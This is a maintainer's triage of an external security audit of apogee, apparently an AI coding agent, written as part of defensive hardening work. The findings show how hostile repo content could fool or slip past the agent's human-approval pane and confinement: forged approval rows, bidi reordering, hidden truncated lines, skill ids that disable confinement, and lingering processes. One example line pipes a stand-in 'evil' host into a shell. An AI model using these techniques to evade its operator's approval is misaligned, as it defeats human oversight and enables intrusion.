# External security audit — triage — 2026-08-11

**Source:** an external audit run against apogee, delivered as a Claude artifact
(`~/Desktop/Apogee security audit.html`). **It is not in-repo**, so this document is the
repository's record of it: everything below was re-derived from the audit's ranked output by three
verification passes that read current code rather than trusting the finding text.

**Verified against:** HEAD `10d7f70`. Earlier passes ran at `d6d1479` and `b0252d4`; line numbers
have drifted since (`gateCacheKey` is now `resolution.go:464`, `stripEscapes`
`transcript.go:1446`, `orderedArgs` `toolpresent.go:2232`, `argumentValueLines`
`toolpresent.go:2279`, `runGit` `git.go:87`). Every mechanism below was re-confirmed at `10d7f70`;
the `file:line` cells in the table are that commit's.

**Fixes:** `docs/plans/private/2026-08-11 - 06 - hostile-bytes-hardening-plan.md`. Each confirmed
position names the plan item that owns it, and `ISSUES.md` carries one line per confirmed finding.

---

## The threat model

The audit's framing is the part worth keeping, and it is the reason most of the raw output was
noise while the ranked subset was not:

> **The operator is trusted. The bytes they operate on are not, and neither is the model.** An
> attacker authors a cloned repo, a fetched page, or an MCP result; apogee reads it; the model
> acts on it. Stock install — `ask-before`, `confine-to-workspace: true`, `present.auto-open:
> true`, `use-project-skills: true`.

That is not the model a generic scanner assumes (supply chain, build integrity, dependency CVEs),
which is why 172 raw findings triaged down to 14 ranked positions. It is also the model that makes
ADR 0012's invariant the yardstick for every verdict here: *a tool call runs without a human gate
only if its blast radius is bounded.* Each confirmed position either lets unbounded work run
without a gate, or makes the approval surface show something other than what the executor will do.

## How to read the verdicts

- **CONFIRMED** — the mechanism exists at HEAD as described, and the cited code is the evidence.
- **PARTIALLY-CONFIRMED** — a live mechanism exists, but the audit's description of it is wrong in
  a way a maintainer would catch. The cell says which half is wrong.
- **REFUTED** — the stated mechanism is defended, usually by a pinned test.

**Rank numbers.** The in-repo record attests positions #1, #5, #6, and the Cluster D set
{#8, #10, #11, #12}. The remaining seven ranked positions are recorded by mechanism rather than by
number, marked `—`; the count reconciles (seven unnumbered findings, seven unattributed slots), but
anyone holding the original artifact should fill the numbers in. Rows marked `*` take their number
from the plan's listing order for the Cluster D set — the set is attested, the one-to-one mapping
within it is inferred.

## The 14 ranked positions

| # | Finding | Verdict | Evidence at `10d7f70` | Owner |
|---|---|---|---|---|
| 1 | `python_exec` runs a stdin program with the workspace ahead of the stdlib on `sys.path`, so a repo-root `json.py` owns any import the snippet makes — and the payload never appears in the `code` argument the operator approves. | CONFIRMED | `internal/tools/python_exec.go:102` builds `argv: []string{interp, "-"}` with `dir` = workspace root and no isolation flag; `internal/platform/seatbelt.go:130` states the box leaves read/exec open, so the Auto path executes the repo's `json.py` too. | item 3 |
| 5 | No exec site is checked against the writable confinement box, so a confined Auto call can plant an executable inside the box and a later unconfined call executes it outside the box. Overwriting an existing 0755 file preserves its exec bit. | CONFIRMED | `box.WritablePaths` appears only in the OS backends that build the write fence (`internal/platform/seatbelt.go:154`, `landlock_linux.go:265`, `winguard.go:108`, `confiner_windows.go:281`) — never at an exec site. Six sites: `tools/git.go` (`lookGit`, `:74`), `tools/python_exec.go:38` (`lookInterpreter`), `tools/run_tests.go:367`, `tools/diagnostics.go:264`, `mechanisms/autofix.go:101`, `present/opener.go:153`. `safeGitEnv` (`git.go:70`) copies `PATH` verbatim through `ScopeEnv` (`platform/host.go:110-140`), so workspace-resident `PATH` entries survive into git's children. | item 2 |
| 6 | A write *through* a final-name symlink redirects the file outside its apparent target. | **REFUTED** | `SafeWriteFile` (`internal/security/safeio.go:76`) replaces the name via rename, pinned by `TestSafeWriteFile_ReplacesInRootSymlinkName` (`internal/security/safeio_test.go:280`). Two real siblings survive and are live: a write whose *parent chain* crosses an in-root directory symlink (`safeio.go:89-99` follows parents deliberately), and `SafeReadFile` (`safeio.go:210`) following a final-name in-root symlink, so `edit_existing_file` / `single_find_and_replace` (`file_edit.go:76`, `find_replace.go:97`) read `.git/config` through `docs/notes.md`, patch it, and write the result to `docs/notes.md`. | item 13 (siblings) |
| 8\* | "Allow for session" is keyed on the bare tool name, so one allow on `terminal` pre-clears every later shell command for the Session — and an approved gate runs with a nil confinement box. The memory is shared by the whole agent tree. | CONFIRMED | `gateCacheKey` (`internal/agent/resolution.go:464`) returns `call.Tool`; arguments never enter the key. `dispatch.go` passes a nil box on the approved path; `internal/agent/approvalcache.go:31,43` is shared across the tree, so an allow granted inside a sub-agent clears the prompt for its parent and siblings. | item 16 |
| 10\* | Unicode bidi overrides survive the TUI strippers, so a right-to-left override in a tool argument visually reorders the approval line: the pane reads as one command and the executor runs another. | PARTIALLY-CONFIRMED | The mechanism is live at three seams: `stripEscapes` (`internal/tui/transcript.go:1446`, `r < 0x20 \|\| r == 0x7f`), `strippableControl` (`internal/title/title.go:410`), and the session-id validator (`internal/session/store.go:73`, same `< 0x20 \|\| 0x7f` test). The audit's claim that *all three* strippers are Cc-only is **wrong**: `web_fetch.go:161` and `library/store.go:386` already test `unicode.In(r, unicode.Cf, unicode.Co, unicode.Cs)` and are fine. | item 17 |
| 11\* | A backgrounded grandchild outlives a clean tool call, and a wedged drain still reports success. | CONFIRMED | `cmd.Cancel` is the only thing that signals the process group and it runs on ctx cancellation alone (`internal/tools/exec_pgroup_unix.go:37`, `exec_pgroup_other.go:51`); a normal exit never signals it. `cmd.WaitDelay = processWaitDelay` (`:54`, `:60`) caps the parent's block at five seconds, and because `exec.ErrWaitDelay` is not an `*exec.ExitError`, `exitCodeOf` (`exec_common.go:159-173`) falls through to `cmd.ProcessState.ExitCode()` — 0, when the leader itself exited cleanly. So a persistence primitive renders as a green tick. No reaper exists at shutdown either. | item 18 |
| 12\* | `go vet` is handed git's environment allowlist, stripping the operator's own Go hardening and putting nothing back; and the tool approves one filename while vetting the whole package. | CONFIRMED | `runGoVet` (`internal/tools/diagnostics.go:199`) passes `env: safeGitEnv()` (`:207`) — git's allowlist (`git.go:55-59`), from which `GOFLAGS`, `GOWORK`, `GOTOOLCHAIN`, `GOPATH`, `GOMODCACHE`, `CGO_ENABLED` and `CC` are all absent; `HOME` passes, so the persistent `go env -w` file still applies. The tool approves `path` (`:52`) and vets `filepath.Dir(abs)` (`:202`), which the description never says. **Do not overclaim:** `go vet` never links, so this is a scope-and-honesty defect, not demonstrated RCE — the audit says so explicitly. | item 19 |
| — | `.html` / `.htm` / `.xhtml` / `.svg` sit in the "renders, never executes" opener allow-list, so `present_document` hands an active container to the desktop handler with no approval in any mode, including Plan. Script in that page reaches loopback, RFC1918 and `169.254.169.254` from the browser's network position, with none of the `URLGuard` filtering that justifies `classNetwork` auto-running. | CONFIRMED (bounded — see below) | `internal/present/opener.go:162` states an extension earns its place "only when its default handler DISPLAYS the file"; the map at `:193` contains `.html` (`:209`) and `.svg` (`:212`). `present_document` is `ReadOnly` (`internal/tools/present_document.go:63`) so it auto-runs in every mode; `AutoOpen` defaults true (`internal/config/config.go:661`). The document need not be model-written — one that arrived in the clone is enough. | item 4 |
| — | The opener execs the **bare** names `open` / `xdg-open` / `cmd`, resolved via `LookPath` against apogee's inherited `PATH` — a process spawned with no approval and a nil box, in every mode. | CONFIRMED (bounded — see below) | `internal/present/opener.go:144-153` (`:153` returns `[]string{"xdg-open", path}`) — the only bare-name exec in non-test code; every other site resolves absolutely. | item 5 |
| — | Newlines in model-authored approval fields paint forged rows on the approval pane, including a fake `Reason:` line above the real one, visually identical to it. | CONFIRMED | `internal/tui/approval.go:212` joins parts with `\n` and the popup paints one row per segment; `stripEscapes` (`transcript.go:1446`) deliberately keeps `\n` and `\t`. A newline in an argument key (`toolpresent.go:2232`) or in a `sub_agent` task (`approval.go:248`, which *leads* the body) forges rows; `approvalPrompt` (`:168`) sets no `bodyLead`, so every body row renders through the same `th.popupBody`. | item 6 |
| — | The approval pane truncates from the head and shows duplicate JSON keys in wire order, so the operator authorises on the strength of what fits and the executor runs something else. | PARTIALLY-CONFIRMED | Live: `popupBodyLines` keeps the first `maxBodyRows−1` rows and drops the rest (`internal/tui/popup.go`, `spec.maxBodyRows` at `:311`, applied at `:407`) — on 80×24 the body budget computes to 6 rows, so a command whose last line is `curl http://evil/x \| sh` is authorised on the strength of `npm test` above it; `argumentValueLines` (`toolpresent.go:2279`) caps nothing, so one long value evicts every sibling; `orderedArgs` (`toolpresent.go:2232`) streams every duplicate in wire order while `decodeArgs` (`internal/tools/tools.go:67`) is stdlib JSON, where the last duplicate wins. **Two audit errors here** — see below. | item 7 |
| — | A skill id may be a command line: an id like `confine off --save` is invisible to the shadow guard and a valid command to the parser, and `<workspace>/.apogee/skills` is an unconditional source that re-scans mid-session. | CONFIRMED | `slashSuggestions` (`internal/tui/autocomplete.go`) drops a skill only when `commandByName` matches the **whole** id, while `matchCommand` (`internal/tui/command.go:297`) cuts at the first space or tab and looks up only the first piece. `validate` (`internal/skills/parse.go:247`) checks four fields are non-empty and nothing else; interior whitespace survives `TrimSpace` (`parse.go:88`). `internal/skills/load.go:70-82` makes the workspace an unconditional source, `use-project-skills` defaults true, and the catalog re-scans whenever the caret enters a `/` token — so one `write_file` goes live in the same turn with no restart. Real sinks: `runConfine` → `SetConfineToWorkspace(false)` plus a persisted `unconfined-hosts:` entry (`internal/tui/confine.go:44-51`), and `/schedule 1m auto <prose>` (`internal/tui/schedule.go:127`). | item 9 |
| — | The skill loader anchors `os.OpenRoot` on a path inside the untrusted repo, so a repo shipping a symlinked anchor relocates the fence; and the walk is unbounded. | PARTIALLY-CONFIRMED | `loadDir` (`internal/skills/load.go:90`) calls `os.OpenRoot(dir)` with no `Lstat` and no containment check; Go's `openRootNolog` does not pass `O_NOFOLLOW` on the anchor itself. **Correction:** a symlink *below* the anchor **is** refused, pinned by `TestLoadSymlinkEscapeRefused` (`load_test.go:290`) — the gap is any component of the *anchor path* (`.apogee`, `skills`, or `.apogee/skills`), which that test does not cover, and the doc comment at `load.go:88` claims the protection that is missing. `maxSkills` (`load.go:27`, checked at `:110`) stops after 1024 *loaded skills*, not directories, so `.apogee/skills → /` walks the whole filesystem. | item 11 |
| — | `git_commit` on an attacker-authored clone executes that repo's hooks, and `.gitattributes` filter drivers and textconv fire on read paths. | CONFIRMED | `runGit` (`internal/tools/git.go:87`) hardens the environment (`env: safeGitEnv()`, `:92`) but nothing on disk: a repo-wide grep finds no `-c`, no `GIT_CONFIG_NOSYSTEM`, no `--no-verify`, no `--no-textconv` and no `core.hooksPath` anywhere in the tree. Delivery needs a repo shipped *with* its `.git` (tarball, mirror, NFS checkout) or one in-workspace write; a plain `git clone` does not carry hooks, so the write variant is the realistic one. `HOME` is allowlisted (`git.go:55`), so a persistent user-level git config still applies — out of scope here, but the fix must say so. | item 15 |

### The desktop-persona bound on the two opener findings

The audit is explicit about this bound and the first triage pass dropped it. `presentationRungs`
wires the opener only on `rungs.Local && p.autoOpen`, and `Opener.argv` additionally requires
`HasDesktop` — so **any** `SSH_*` variable in the environment flips `Locality` to Remote and the
opener is never built. A headless container has neither half. Both findings are therefore bounded
to a local desktop session. That is still apogee's primary persona, so items 4 and 5 keep their
place — but stating the finding without the bound overstates it to a maintainer who will check.

`climb` (`internal/tui/presenter.go:136-153`) makes the two presentation branches exclusive: a
Local session attempts rung 1 and then degrades to the **baseline transcript rung**, never falling
through to rung 2. So removing the four extensions stops a Local `present_document report.html`
launching a browser at all; rung 2 is the Remote path, and a CSP is what bounds it there.

## Audit errors worth recording

Four claims in the audit are wrong as written. Recording them keeps a later reader from
re-deriving the correction, and keeps this plan honest about what it is fixing.

1. **The pane truncation is not silent.** The audit describes rows vanishing without a trace; the
   pane prints `… (+N more lines)`, pinned by `TestModelApprovalNamesTheProseItCannotShow`. The
   real defect is *which* rows survive — head-only, so an appended payload on the last line is the
   part that disappears — not that the operator is given no signal at all.
2. **The duplicate-key trick does not bypass the guards.** `security/dangerous.go` and
   `tools/workspace_scoped.go` decode last-wins too, matching `decodeArgs`
   (`internal/tools/tools.go:67`). Only the **pane** disagrees with the executor. The finding is a
   disclosure defect on one surface, not a guard evasion.
3. **The Cf claim is half-wrong.** The audit says "all three strippers test `unicode.IsControl`,
   which is Cc only". `web_fetch.go:161` and `library/store.go:386` already drop `unicode.Cf`
   explicitly. The gap is three *other* seams (`transcript.go:1446`, `title.go:410`,
   `session/store.go:73`), named in item 17.
4. **Position #6 is defended as stated.** See the table: `SafeWriteFile` replaces the name via
   rename and the behaviour is pinned by a test. The two adjacent mechanisms that *are* live are a
   different shape (parent-chain symlinks on write, followed symlinks on read), and item 13
   restates them correctly rather than inheriting the audit's wording.

## Excluded by threat model or by prior decision

These buckets are deliberate exclusions, not oversights. No fix item may drift into them.

- **Operator-armed footguns:** `present.command`, `--workspace /` or `$HOME`, `APOGEE_MODE=auto`,
  the markdown-fenced model profile, the llama-launcher surface, a bare-name `mcp-servers`
  command. Each needs a config value or flag nobody picks by accident, which puts them outside a
  threat model whose first premise is that the operator is trusted. The MCP-command and editor exec
  surfaces (`mcp/transport.go:118`, `tui/settings.go:734`/`:751`,
  `cmd/apogee/settingsedit.go:134`/`:388`) fall here, which is why the exec-site enumeration in
  item 2 stops at six.
- **Attacks on apogee's own build and release:** the `go.work` backdoor, the `VERSION`-into-`make
  dist` splice, unsigned laptop-built releases, the unpinned default system prompt. All presuppose
  that the audited workspace *is* the apogee repo — a different situation from a cloned repo apogee
  is pointed at.
- **`TODO.md` L2 / L3 / L4 acceptances:** the dangerous-action guard being trivially evadable (L2),
  read-and-exfiltrate from inside the box (L3), stdio MCP environment inheritance (L4). Triaged
  against below.
- **Hostile inference endpoint / transport:** unclamped `/props` and `/v1/models` values, the model
  id reaching `os.Open`, the gauge-overflow OOM, the bearer resent across a scheme downgrade. These
  assume a proxy you do not control — a different threat model from the default posture.
- **The gate-reason wording** (`resolution.go` announcing "confinement unavailable on this host" on
  every gated subprocess). Real, but already owned by
  `docs/plans/2026-08-11 - 03 - subprocess-gate-reason-plan.md`.
- **Human-timing attacks on the gate:** `⇧⇥` re-authorising an in-flight batch, the menu opening on
  Allow with no key flush, the `/schedule` picker staying interactive. Real and always-on, but TUI
  ergonomics rather than hostile bytes — a candidate second wave.

## Triaged against the L2 / L3 / L4 acceptances

The audit's own strongest observation is that a deferred-acceptance in `TODO.md` is the single
biggest predictor of a finding being answered "intended". So every ranked position was checked
against L2, L3 and L4 before being accepted. **None of the fourteen dies on those acceptances**,
for reasons worth stating individually:

- **L2 — the dangerous-action guard normalises only whitespace and case, so it is trivially
  evadable; it is not a security boundary** (`internal/security/doc.go` says so). Not one of the
  fourteen is a complaint that the guard can be evaded. The pane-integrity positions (items 6, 7,
  8, 17) are about a *disclosure* surface: what the human is shown before they authorise, which L2
  says nothing about. Item 14 adds two paths to the floor without touching `MergeDangerousRules`
  semantics, so L1 and L2 stay exactly as they are.
- **L3 — a confined subprocess can read any host file and open the network, so exfiltration is
  in-design.** L3 dismisses read-and-send findings. It does not dismiss items 2, 3, 5 and 18, which
  are about *unbounded execution*: code running outside the box (item 2), code the operator never
  saw running inside it (item 3), a process spawned with no approval and a nil box (item 5), and a
  process that outlives the call that spawned it (item 18). ADR 0012's invariant — a call runs
  ungated only if its blast radius is bounded — is what those violate, and L3 does not weaken it.
- **L4 — a configured stdio MCP server inherits apogee's full environment, and that is intended.**
  L4 is a statement about the MCP launch surface specifically. It does not cover item 3's narrower
  change (dropping apogee's *own* credentials — `APOGEE_API_KEY` and any configured server key —
  from what `python_exec` and `terminal` inherit), which is not the blanket allowlist L4 deferred;
  nor item 19, where the defect is that the Go toolchain was handed *git's* allowlist, stripping
  the operator's hardening without putting anything back.

## Below the ranked tier, but owned by this plan

Four fixes in the plan are not among the fourteen. They are recorded here so nobody later reads
them as scope creep:

- **item 8** — the resolved write/read target is computed (`internal/agent/dispatch.go:784-808`) but
  consumed only as a bool for the gate decision; no `internal/tui` surface renders it. It is the
  shared disclosure mechanism items 7 and 13 both depend on.
- **item 10** — no surface shows whether a loaded skill came from the cloned repo, the user library
  or the builtins, though `Skill.Dir` is carried. It is what makes item 9's residual deception
  survivable.
- **item 12** — `ReloadSkills` runs a synchronous disk walk on the Bubble Tea update goroutine. An
  ADR 0011 violation surfaced by item 11's work on the same walk, not an audit finding.
- **item 14** — the dangerous floor names `.ssh`, `.aws`, `.netrc` and `.npmrc` but neither `.git/`
  nor apogee's own `~/.apogee` control plane. An asymmetry the audit rates a one-regex fix.
